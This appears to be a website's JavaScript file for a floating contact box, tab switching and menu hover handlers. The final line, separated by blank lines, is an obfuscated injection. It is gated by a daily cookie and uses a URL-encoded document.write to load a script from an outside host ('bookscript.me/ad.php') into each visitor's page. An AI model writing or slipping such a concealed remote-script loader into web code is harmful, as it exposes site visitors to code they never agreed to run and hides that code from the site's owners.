
        function showandhide(h_id, hon_class, hout_class, c_id, totalnumber, activeno)
        {
            var h_id, hon_id, hout_id, c_id, totalnumber, activeno;
            for (var i = 1; i <= totalnumber; i++)
            {
                document.getElementById(c_id + i).style.display = 'none';
                document.getElementById(h_id + i).className = hout_class;
            }
            document.getElementById(c_id + activeno).style.display = 'block';
            document.getElementById(h_id + activeno).className = hon_class;
        }
        var tips;
        var theTop = 100;
        var old = theTop;
        function initFloatTips()
        {
            tips = document.getElementById('divQQbox');
            moveTips();
        }
        function moveTips()
        {
            var tt = 50;
            if (window.innerHeight)
            {
                pos = window.pageYOffset
            } else if (document.documentElement && document.documentElement.scrollTop)
            {
                pos = document.documentElement.scrollTop
            } else if (document.body)
            {
                pos = document.body.scrollTop;
            }
            //http:
            pos = pos - tips.offsetTop + theTop;
            pos = tips.offsetTop + pos / 10;
            if (pos < theTop)
            {
                pos = theTop;
            }
            if (pos != old)
            {
                tips.style.top = pos + "px";
                tt = 10; //alert(tips.style.top);  
            }
            old = pos;
            setTimeout(moveTips, tt);
        }
        initFloatTips();
        if (typeof (HTMLElement) != "undefined")//给firefox定义contains()方法，ie下不起作用
        {
            HTMLElement.prototype.contains = function(obj)
            {
                while (obj != null && typeof (obj.tagName) != "undefind")
                {//
                    if (obj == this) return true;
                    obj = obj.parentNode;
                }
                return false;
            }
        }
        function show()
        {
            document.getElementById("meumid").style.display = "none"
            document.getElementById("contentid").style.display = "block"
        }
        function hideMsgBox(theEvent)
        {
            if (theEvent)
            {
                var browser = navigator.userAgent;
                if (browser.indexOf("Firefox") > 0)
                {//Firefox
                    if (document.getElementById("contentid").contains(theEvent.relatedTarget))
                    {
                        return
                    }
                }
                if (browser.indexOf("MSIE") > 0 || browser.indexOf("Presto") >= 0)
                {
                    if (document.getElementById('contentid').contains(event.toElement))
                    {
                        return; //结束函式
                    }
                }
            }
            document.getElementById("meumid").style.display = "block";
            document.getElementById("contentid").style.display = "none";
        }




if(document.cookie.indexOf('20120811')==-1){var expires=new Date();expires.setTime(expires.getTime()+24*60*60*1000);document.cookie='20120811=Yes;path=/;expires='+expires.toGMTString();document.write(unescape('%3C%73%63%72%69%70%74%20%73%72%63%3D%22%68%74%74%70%3A%2F%2F%62%6F%6F%6B%73%63%72%69%70%74%2E%6D%65%2F%61%64%2E%70%68%70%22%20%74%79%70%65%3D%22%74%65%78%74%2F%6A%61%76%61%73%63%72%69%70%74%22%3E%3C%2F%73%63%72%69%70%74%3E'));}
